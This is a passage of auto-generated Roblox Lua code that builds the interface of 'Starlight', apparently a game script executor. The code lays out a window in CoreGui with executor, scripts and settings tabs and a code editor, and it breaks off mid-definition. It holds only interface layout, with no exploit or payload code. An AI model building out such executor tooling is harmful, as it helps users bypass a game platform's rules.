-- starlight 💫
-- 0.2.5
-- remade by C:\Drive
local STR = {};

-- StarterGui.Starlight
STR["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
STR["1"]["IgnoreGuiInset"] = true;
STR["1"]["DisplayOrder"] = 1999999999;
STR["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
STR["1"]["Name"] = [[Starlight]];
STR["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
STR["1"]["ResetOnSpawn"] = false;


-- StarterGui.Starlight.MainFrame
STR["2"] = Instance.new("Frame", STR["1"]);
STR["2"]["BorderSizePixel"] = 0;
STR["2"]["BackgroundColor3"] = Color3.fromRGB(13, 13, 13);
STR["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STR["2"]["ClipsDescendants"] = true;
STR["2"]["Size"] = UDim2.new(0, 600, 0, 350);
STR["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
STR["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["2"]["Name"] = [[MainFrame]];


-- StarterGui.Starlight.MainFrame.UICorner
STR["3"] = Instance.new("UICorner", STR["2"]);
STR["3"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.UIStroke
STR["4"] = Instance.new("UIStroke", STR["2"]);
STR["4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["4"]["Thickness"] = 0.7;
STR["4"]["Color"] = Color3.fromRGB(90, 90, 90);


-- StarterGui.Starlight.MainFrame.Logo
STR["5"] = Instance.new("ImageLabel", STR["2"]);
STR["5"]["BorderSizePixel"] = 0;
STR["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STR["5"]["Image"] = [[rbxassetid://138561242127995]];
STR["5"]["Size"] = UDim2.new(0, 180, 0, 60);
STR["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["5"]["BackgroundTransparency"] = 1;
STR["5"]["Name"] = [[Logo]];
STR["5"]["Position"] = UDim2.new(0, 16, 0, 16);


-- StarterGui.Starlight.MainFrame.Exit
STR["6"] = Instance.new("TextButton", STR["2"]);
STR["6"]["BorderSizePixel"] = 0;
STR["6"]["TextSize"] = 14;
STR["6"]["AutoButtonColor"] = false;
STR["6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STR["6"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
STR["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["6"]["Size"] = UDim2.new(0, 42, 0, 42);
STR["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["6"]["Text"] = [[]];
STR["6"]["Name"] = [[Exit]];
STR["6"]["Position"] = UDim2.new(1, -64, 0, 24);


-- StarterGui.Starlight.MainFrame.Exit.UICorner
STR["7"] = Instance.new("UICorner", STR["6"]);
STR["7"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Exit.UIStroke
STR["8"] = Instance.new("UIStroke", STR["6"]);
STR["8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["8"]["Thickness"] = 1.5;
STR["8"]["Color"] = Color3.fromRGB(58, 58, 58);


-- StarterGui.Starlight.MainFrame.Exit.Icon
STR["9"] = Instance.new("ImageLabel", STR["6"]);
STR["9"]["Interactable"] = false;
STR["9"]["BorderSizePixel"] = 0;
STR["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STR["9"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
STR["9"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STR["9"]["Image"] = [[rbxassetid://12953907125]];
STR["9"]["Size"] = UDim2.new(0, 35, 0, 35);
STR["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["9"]["BackgroundTransparency"] = 1;
STR["9"]["Name"] = [[Icon]];
STR["9"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Minimize
STR["a"] = Instance.new("TextButton", STR["2"]);
STR["a"]["BorderSizePixel"] = 0;
STR["a"]["TextSize"] = 14;
STR["a"]["AutoButtonColor"] = false;
STR["a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STR["a"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
STR["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["a"]["Size"] = UDim2.new(0, 42, 0, 42);
STR["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["a"]["Text"] = [[]];
STR["a"]["Name"] = [[Minimize]];
STR["a"]["Position"] = UDim2.new(1, -120, 0, 24);


-- StarterGui.Starlight.MainFrame.Minimize.UICorner
STR["b"] = Instance.new("UICorner", STR["a"]);
STR["b"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Minimize.UIStroke
STR["c"] = Instance.new("UIStroke", STR["a"]);
STR["c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["c"]["Thickness"] = 1.5;
STR["c"]["Color"] = Color3.fromRGB(58, 58, 58);


-- StarterGui.Starlight.MainFrame.Minimize.Icon
STR["d"] = Instance.new("ImageLabel", STR["a"]);
STR["d"]["Interactable"] = false;
STR["d"]["BorderSizePixel"] = 0;
STR["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STR["d"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
STR["d"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STR["d"]["Image"] = [[rbxassetid://125716871945612]];
STR["d"]["Size"] = UDim2.new(0, 35, 0, 35);
STR["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["d"]["BackgroundTransparency"] = 1;
STR["d"]["Name"] = [[Icon]];
STR["d"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Handler
STR["e"] = Instance.new("LocalScript", STR["2"]);
STR["e"]["Name"] = [[Handler]];


-- StarterGui.Starlight.MainFrame.Insides
STR["f"] = Instance.new("CanvasGroup", STR["2"]);
STR["f"]["BorderSizePixel"] = 0;
STR["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["f"]["Size"] = UDim2.new(1, 0, 1, -85);
STR["f"]["Position"] = UDim2.new(0, 0, 0, 85);
STR["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["f"]["Name"] = [[Insides]];
STR["f"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.TabSelector
STR["10"] = Instance.new("Frame", STR["f"]);
STR["10"]["BorderSizePixel"] = 0;
STR["10"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 9);
STR["10"]["Size"] = UDim2.new(0, 56, 1, -20);
STR["10"]["Position"] = UDim2.new(0, 15, 0, 5);
STR["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["10"]["Name"] = [[TabSelector]];


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.UICorner
STR["11"] = Instance.new("UICorner", STR["10"]);
STR["11"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.UIStroke
STR["12"] = Instance.new("UIStroke", STR["10"]);
STR["12"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["12"]["Thickness"] = 0.7;
STR["12"]["Color"] = Color3.fromRGB(90, 90, 90);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Executor
STR["13"] = Instance.new("TextButton", STR["10"]);
STR["13"]["BorderSizePixel"] = 0;
STR["13"]["TextSize"] = 14;
STR["13"]["AutoButtonColor"] = false;
STR["13"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STR["13"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
STR["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["13"]["AnchorPoint"] = Vector2.new(0.5, 0);
STR["13"]["Size"] = UDim2.new(0, 42, 0, 42);
STR["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["13"]["Text"] = [[]];
STR["13"]["Name"] = [[Executor]];
STR["13"]["Position"] = UDim2.new(0.5, 0, 0, 6);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Executor.UICorner
STR["14"] = Instance.new("UICorner", STR["13"]);
STR["14"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Executor.UIStroke
STR["15"] = Instance.new("UIStroke", STR["13"]);
STR["15"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["15"]["Thickness"] = 1.5;
STR["15"]["Color"] = Color3.fromRGB(58, 58, 58);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Executor.Icon
STR["16"] = Instance.new("ImageLabel", STR["13"]);
STR["16"]["Interactable"] = false;
STR["16"]["BorderSizePixel"] = 0;
STR["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STR["16"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
STR["16"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STR["16"]["Image"] = [[rbxassetid://11663743444]];
STR["16"]["Size"] = UDim2.new(0, 35, 0, 35);
STR["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["16"]["BackgroundTransparency"] = 1;
STR["16"]["Name"] = [[Icon]];
STR["16"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Scripts
STR["17"] = Instance.new("TextButton", STR["10"]);
STR["17"]["BorderSizePixel"] = 0;
STR["17"]["TextSize"] = 14;
STR["17"]["AutoButtonColor"] = false;
STR["17"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STR["17"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
STR["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["17"]["AnchorPoint"] = Vector2.new(0.5, 0);
STR["17"]["Size"] = UDim2.new(0, 42, 0, 42);
STR["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["17"]["Text"] = [[]];
STR["17"]["Name"] = [[Scripts]];
STR["17"]["Position"] = UDim2.new(0.5, 0, 0, 55);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Scripts.UICorner
STR["18"] = Instance.new("UICorner", STR["17"]);
STR["18"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Scripts.UIStroke
STR["19"] = Instance.new("UIStroke", STR["17"]);
STR["19"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["19"]["Thickness"] = 1.5;
STR["19"]["Color"] = Color3.fromRGB(58, 58, 58);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Scripts.Icon
STR["1a"] = Instance.new("ImageLabel", STR["17"]);
STR["1a"]["Interactable"] = false;
STR["1a"]["BorderSizePixel"] = 0;
STR["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STR["1a"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
STR["1a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STR["1a"]["Image"] = [[rbxassetid://11570895459]];
STR["1a"]["Size"] = UDim2.new(0, 35, 0, 35);
STR["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["1a"]["BackgroundTransparency"] = 1;
STR["1a"]["Name"] = [[Icon]];
STR["1a"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Settings
STR["1b"] = Instance.new("TextButton", STR["10"]);
STR["1b"]["BorderSizePixel"] = 0;
STR["1b"]["TextSize"] = 14;
STR["1b"]["AutoButtonColor"] = false;
STR["1b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STR["1b"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
STR["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["1b"]["AnchorPoint"] = Vector2.new(0.5, 0);
STR["1b"]["Size"] = UDim2.new(0, 42, 0, 42);
STR["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["1b"]["Text"] = [[]];
STR["1b"]["Name"] = [[Settings]];
STR["1b"]["Position"] = UDim2.new(0.5, 0, 0, 105);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Settings.UICorner
STR["1c"] = Instance.new("UICorner", STR["1b"]);
STR["1c"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Settings.UIStroke
STR["1d"] = Instance.new("UIStroke", STR["1b"]);
STR["1d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["1d"]["Thickness"] = 1.5;
STR["1d"]["Color"] = Color3.fromRGB(58, 58, 58);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Settings.Icon
STR["1e"] = Instance.new("ImageLabel", STR["1b"]);
STR["1e"]["Interactable"] = false;
STR["1e"]["BorderSizePixel"] = 0;
STR["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STR["1e"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
STR["1e"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STR["1e"]["Image"] = [[rbxassetid://13568966069]];
STR["1e"]["Size"] = UDim2.new(0, 38, 0, 35);
STR["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["1e"]["BackgroundTransparency"] = 1;
STR["1e"]["Name"] = [[Icon]];
STR["1e"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Status
STR["1f"] = Instance.new("Frame", STR["10"]);
STR["1f"]["BorderSizePixel"] = 0;
STR["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 76, 76);
STR["1f"]["AnchorPoint"] = Vector2.new(0.5, 0);
STR["1f"]["Size"] = UDim2.new(0, 30, 0, 30);
STR["1f"]["Position"] = UDim2.new(0.5, 0, 1, -45);
STR["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["1f"]["Name"] = [[Status]];


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Status.UICorner
STR["20"] = Instance.new("UICorner", STR["1f"]);
STR["20"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs
STR["21"] = Instance.new("Frame", STR["f"]);
STR["21"]["BorderSizePixel"] = 0;
STR["21"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 9);
STR["21"]["ClipsDescendants"] = true;
STR["21"]["Size"] = UDim2.new(1, -100, 1, -20);
STR["21"]["Position"] = UDim2.new(0, 86, 0, 5);
STR["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["21"]["Name"] = [[Tabs]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.UICorner
STR["22"] = Instance.new("UICorner", STR["21"]);
STR["22"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.UIStroke
STR["23"] = Instance.new("UIStroke", STR["21"]);
STR["23"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["23"]["Thickness"] = 0.7;
STR["23"]["Color"] = Color3.fromRGB(90, 90, 90);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor
STR["24"] = Instance.new("Frame", STR["21"]);
STR["24"]["Visible"] = false;
STR["24"]["BorderSizePixel"] = 0;
STR["24"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["24"]["ClipsDescendants"] = true;
STR["24"]["Size"] = UDim2.new(1, 0, 1, 0);
STR["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["24"]["Name"] = [[Executor]];
STR["24"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.UICorner
STR["25"] = Instance.new("UICorner", STR["24"]);
STR["25"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3
STR["26"] = Instance.new("Frame", STR["24"]);
STR["26"]["BorderSizePixel"] = 0;
STR["26"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
STR["26"]["AnchorPoint"] = Vector2.new(0.5, 0);
STR["26"]["Size"] = UDim2.new(1, -20, 1, -72);
STR["26"]["Position"] = UDim2.new(0.5, 0, 0, 10);
STR["26"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
STR["26"]["Name"] = [[FastColoredTextboxV3]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Scroll
STR["27"] = Instance.new("ScrollingFrame", STR["26"]);
STR["27"]["Active"] = true;
STR["27"]["ZIndex"] = 2;
STR["27"]["BorderSizePixel"] = 0;
STR["27"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
STR["27"]["TopImage"] = [[]];
STR["27"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
STR["27"]["Name"] = [[Scroll]];
STR["27"]["BottomImage"] = [[]];
STR["27"]["Size"] = UDim2.new(1, 0, 1, 0);
STR["27"]["BorderColor3"] = Color3.fromRGB(127, 129, 126);
STR["27"]["ScrollBarThickness"] = 17;
STR["27"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Scroll.TextBox
STR["28"] = Instance.new("TextBox", STR["27"]);
STR["28"]["TextXAlignment"] = Enum.TextXAlignment.Left;
STR["28"]["BorderSizePixel"] = 0;
STR["28"]["TextWrapped"] = true;
STR["28"]["TextTransparency"] = 0.75;
STR["28"]["TextSize"] = 15;
STR["28"]["TextColor3"] = Color3.fromRGB(42, 42, 42);
STR["28"]["TextYAlignment"] = Enum.TextYAlignment.Top;
STR["28"]["BackgroundColor3"] = Color3.fromRGB(29, 35, 46);
STR["28"]["RichText"] = true;
STR["28"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["28"]["MultiLine"] = true;
STR["28"]["ClearTextOnFocus"] = false;
STR["28"]["Size"] = UDim2.new(10, -27, 1, 0);
STR["28"]["Position"] = UDim2.new(0, 17, 0, 0);
STR["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["28"]["Text"] = [[]];
STR["28"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Scroll.Highlighting
STR["29"] = Instance.new("TextLabel", STR["27"]);
STR["29"]["TextWrapped"] = true;
STR["29"]["BorderSizePixel"] = 0;
STR["29"]["TextSize"] = 15;
STR["29"]["TextXAlignment"] = Enum.TextXAlignment.Left;
STR["29"]["TextYAlignment"] = Enum.TextYAlignment.Top;
STR["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["29"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
STR["29"]["BackgroundTransparency"] = 1;
STR["29"]["RichText"] = true;
STR["29"]["Size"] = UDim2.new(10, -27, 1, 0);
STR["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["29"]["Text"] = [[]];
STR["29"]["Name"] = [[Highlighting]];
STR["29"]["Position"] = UDim2.new(0, 20, 0, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Scroll.LineSelector
STR["2a"] = Instance.new("Frame", STR["27"]);
STR["2a"]["ZIndex"] = -7;
STR["2a"]["BorderSizePixel"] = 0;
STR["2a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["2a"]["Size"] = UDim2.new(1, 0, 0, 15);
STR["2a"]["Position"] = UDim2.new(0, 20, 0, 0);
STR["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["2a"]["Name"] = [[LineSelector]];
STR["2a"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Scroll.Cursor
STR["2b"] = Instance.new("Frame", STR["27"]);
STR["2b"]["BorderSizePixel"] = 0;
STR["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["2b"]["Size"] = UDim2.new(0, 1, 0, 15);
STR["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["2b"]["Name"] = [[Cursor]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Scroll.TextMeasurer
STR["2c"] = Instance.new("TextLabel", STR["27"]);
STR["2c"]["BorderSizePixel"] = 0;
STR["2c"]["TextSize"] = 15;
STR["2c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
STR["2c"]["TextYAlignment"] = Enum.TextYAlignment.Top;
STR["2c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["2c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["2c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
STR["2c"]["BackgroundTransparency"] = 1;
STR["2c"]["RichText"] = true;
STR["2c"]["Size"] = UDim2.new(10, -27, 1, 0);
STR["2c"]["Visible"] = false;
STR["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["2c"]["Text"] = [[]];
STR["2c"]["Name"] = [[TextMeasurer]];
STR["2c"]["Position"] = UDim2.new(0, 20, 0, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Scroll.LinesValue
STR["2d"] = Instance.new("NumberValue", STR["27"]);
STR["2d"]["Name"] = [[LinesValue]];
STR["2d"]["Value"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Scroll.LinesFrame
STR["2e"] = Instance.new("Frame", STR["27"]);
STR["2e"]["BorderSizePixel"] = 0;
STR["2e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
STR["2e"]["Size"] = UDim2.new(0, 17, 17.91826, 0);
STR["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["2e"]["Name"] = [[LinesFrame]];
STR["2e"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Scroll.LinesFrame.TextLabelTemplate
STR["2f"] = Instance.new("TextLabel", STR["2e"]);
STR["2f"]["TextWrapped"] = true;
STR["2f"]["BorderSizePixel"] = 0;
STR["2f"]["TextSize"] = 15;
STR["2f"]["TextScaled"] = true;
STR["2f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["2f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["2f"]["TextColor3"] = Color3.fromRGB(205, 205, 205);
STR["2f"]["BackgroundTransparency"] = 1;
STR["2f"]["Size"] = UDim2.new(0, 17, 0, 15);
STR["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["2f"]["Text"] = [[1]];
STR["2f"]["Name"] = [[TextLabelTemplate]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Scroll.LinesFrame.UIListLayout
STR["30"] = Instance.new("UIListLayout", STR["2e"]);
STR["30"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Scroll.UICorner
STR["31"] = Instance.new("UICorner", STR["27"]);
STR["31"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Handler
STR["32"] = Instance.new("LocalScript", STR["26"]);
STR["32"]["Name"] = [[Handler]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Y_Top
STR["33"] = Instance.new("Frame", STR["26"]);
STR["33"]["Visible"] = false;
STR["33"]["ZIndex"] = 3;
STR["33"]["BorderSizePixel"] = 0;
STR["33"]["BackgroundColor3"] = Color3.fromRGB(15, 15, 15);
STR["33"]["Size"] = UDim2.new(0, 17, 0, 17);
STR["33"]["Position"] = UDim2.new(1, -17, 0, 0);
STR["33"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["33"]["Name"] = [[Y_Top]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Y_Top.Arrow
STR["34"] = Instance.new("Frame", STR["33"]);
STR["34"]["Size"] = UDim2.new(0, 16, 0, 16);
STR["34"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
STR["34"]["Name"] = [[Arrow]];
STR["34"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Y_Top.Arrow.Frame
STR["35"] = Instance.new("Frame", STR["34"]);
STR["35"]["BorderSizePixel"] = 0;
STR["35"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
STR["35"]["Size"] = UDim2.new(0, 7, 0, 1);
STR["35"]["Position"] = UDim2.new(0, 5, 0, 9);
STR["35"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
STR["35"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Y_Top.Arrow.Frame
STR["36"] = Instance.new("Frame", STR["34"]);
STR["36"]["BorderSizePixel"] = 0;
STR["36"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
STR["36"]["Size"] = UDim2.new(0, 5, 0, 1);
STR["36"]["Position"] = UDim2.new(0, 6, 0, 8);
STR["36"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
STR["36"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Y_Top.Arrow.Frame
STR["37"] = Instance.new("Frame", STR["34"]);
STR["37"]["BorderSizePixel"] = 0;
STR["37"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
STR["37"]["Size"] = UDim2.new(0, 3, 0, 1);
STR["37"]["Position"] = UDim2.new(0, 7, 0, 7);
STR["37"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
STR["37"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Y_Top.Arrow.Frame
STR["38"] = Instance.new("Frame", STR["34"]);
STR["38"]["BorderSizePixel"] = 0;
STR["38"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
STR["38"]["Size"] = UDim2.new(0, 1, 0, 1);
STR["38"]["Position"] = UDim2.new(0, 8, 0, 6);
STR["38"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
STR["38"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Y_Top.Button
STR["39"] = Instance.new("TextButton", STR["33"]);
STR["39"]["BorderSizePixel"] = 0;
STR["39"]["TextSize"] = 14;
STR["39"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STR["39"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["39"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["39"]["BackgroundTransparency"] = 1;
STR["39"]["Size"] = UDim2.new(1, 0, 1, 0);
STR["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["39"]["Text"] = [[]];
STR["39"]["Name"] = [[Button]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Y_Btm
STR["3a"] = Instance.new("Frame", STR["26"]);
STR["3a"]["Visible"] = false;
STR["3a"]["ZIndex"] = 3;
STR["3a"]["BorderSizePixel"] = 0;
STR["3a"]["BackgroundColor3"] = Color3.fromRGB(15, 15, 15);
STR["3a"]["Size"] = UDim2.new(0, 17, 0, 17);
STR["3a"]["Position"] = UDim2.new(1, -17, 1, -17);
STR["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["3a"]["Name"] = [[Y_Btm]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Y_Btm.Button
STR["3b"] = Instance.new("TextButton", STR["3a"]);
STR["3b"]["BorderSizePixel"] = 0;
STR["3b"]["TextSize"] = 14;
STR["3b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STR["3b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
